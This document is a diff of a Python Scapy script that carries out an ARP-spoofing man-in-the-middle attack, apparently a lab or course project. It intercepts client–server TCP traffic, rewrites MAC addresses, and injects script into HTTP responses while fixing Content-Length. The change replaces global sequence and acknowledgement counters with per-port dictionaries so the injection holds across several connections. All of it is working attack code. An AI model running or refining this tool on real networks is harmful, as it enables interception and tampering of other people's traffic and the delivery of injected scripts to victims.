@@ -55,7 +55,7 @@ def restore(srcIP, srcMAC, dstIP, dstMAC):
 
 # TODO: handle intercepted packets
 def interceptor(packet):
-	global clientMAC, clientIP, serverMAC, serverIP, attackerMAC, script, inject_len,  clientACK, serverSEQ, flag, extra_SEQ
+	global clientMAC, clientIP, serverMAC, serverIP, attackerMAC, script, inject_len,  clientACK, serverSEQ, flag, ack_dict, seq_dict
 	# The packet should only be intercepted if it's caused from a spoofed ARP table
 	if packet != None and packet.haslayer(IP) and packet.getlayer(Ether).src != attackerMAC and packet.getlayer(IP).src != attackerIP and packet.getlayer(IP).dst != attackerIP and packet.haslayer(TCP):
 		# Scapy has the power to automatically fill in any empty attributes in any of the layers. so delete the things that need updating, and Scapy will fill them in accordingly
@@ -64,6 +64,15 @@ def interceptor(packet):
 		del packet.getlayer(TCP).chksum
 
 		#packet.show()
+		if packet[Ether].src == clientMAC:
+			debug(f"Currently on port {packet[TCP].sport}")
+			if not (packet[TCP].sport in ack_dict):
+				ack_dict[packet[TCP].sport] = packet[TCP].ack
+		elif packet[Ether].src == serverMAC:
+			debug(f"Currently on port {packet[TCP].dport}")
+			if not (packet[TCP].dport in seq_dict):
+				ack_dict[packet[TCP].dport] = packet[TCP].seq
+				seq_dict[packet[TCP].dport] = packet[TCP].seq
 
 		additional_bytes = 1
 
@@ -74,16 +83,16 @@ def interceptor(packet):
 			packet.getlayer(Ether).dst = serverMAC
 			# Set flag to 0 (though it'll eventually be useless)
 			flag = 0
-			clientACK = packet[TCP].ack
-			serverSEQ = 0
+			ack_dict[packet[TCP].sport] = packet[TCP].ack
+			seq_dict[packet[TCP].sport] = 0
 		elif packet.getlayer(TCP).flags == "SA":
 			debug(f"The above packet is an HTTP SYN+ACK packet!")
 			# Change the MAC addresses
 			packet.getlayer(Ether).src = attackerMAC
 			packet.getlayer(Ether).dst = clientMAC
 			# Set the global clientSEQ and serverACK variables
-			clientACK = packet[TCP].seq
-			serverSEQ = packet[TCP].seq
+			ack_dict[packet[TCP].dport] = packet[TCP].seq
+			seq_dict[packet[TCP].dport] = packet[TCP].seq
 
 		elif packet.haslayer(Raw):
 			if packet[Ether].src == clientMAC:
@@ -119,11 +128,11 @@ def interceptor(packet):
 					new_length = int(old_length)+inject_len
 					additional_digits = len(str(new_length)) - len(old_length)
 					if additional_digits > 0:
-						clientACK -= additional_digits
+						ack_dict[packet[TCP].dport] -= additional_digits
 					new_html = new_html.replace("Content-Length: "+old_length,"Content-Length: "+str(new_length))
 					#debug(f"New HTML is: {new_html}")
-					additional_bytes = len(new_html)
 
+				additional_bytes = len(new_html)
 				packet[Raw].load = new_html
 				#debug(f"New HTML is: {new_html}")
 
@@ -167,27 +176,28 @@ def interceptor(packet):
 				# Change the MAC addresses
 				packet.getlayer(Ether).src = attackerMAC
 				packet.getlayer(Ether).dst = serverMAC
+				ack_dict[packet[TCP].sport] = packet[TCP].ack
 			elif packet[Ether].src == serverMAC:
 				debug(f"The above packet is a RST packet from server!")
 				# Change the MAC addresses
 				packet[Ether].src = attackerMAC
 				packet[Ether].dst = clientMAC
+				seq_dict[packet[TCP].dport] = packet[TCP].seq
 
 		debug(f"Original ACK is {packet[TCP].ack}")
 		debug(f"Original SEQ is {packet[TCP].seq}")
 		if packet[Ether].dst == serverMAC:
-			packet[TCP].ack = clientACK
+			packet[TCP].ack = ack_dict[packet[TCP].sport]
 		# Only update the things when the server sends something to client
 		else:
-			packet[TCP].seq = serverSEQ
+			packet[TCP].seq = seq_dict[packet[TCP].dport]
 			if flag == 1:
-				clientACK += len(packet[Raw].load) - inject_len
-				serverSEQ += len(packet[Raw].load)
-				extra_SEQ = 0
+				ack_dict[packet[TCP].dport] += len(packet[Raw].load) - inject_len
+				seq_dict[packet[TCP].dport] += len(packet[Raw].load)
 				flag = 0
 			else:
-				clientACK += additional_bytes
-				serverSEQ += additional_bytes
+				ack_dict[packet[TCP].dport] += additional_bytes
+				seq_dict[packet[TCP].dport] += additional_bytes
 		debug(f"New ACK is {packet[TCP].ack}")
 		debug(f"New SEQ is {packet[TCP].seq}")
 
@@ -209,7 +219,8 @@ if __name__ == "__main__":
     flag = 0
     clientACK = 0
     serverSEQ = 0
-    extra_SEQ = 0
+    ack_dict = dict()
+    seq_dict = dict()
 
     attackerMAC = get_if_hwaddr(args.interface)
     debug(f"Attacker MAC is {attackerMAC}")
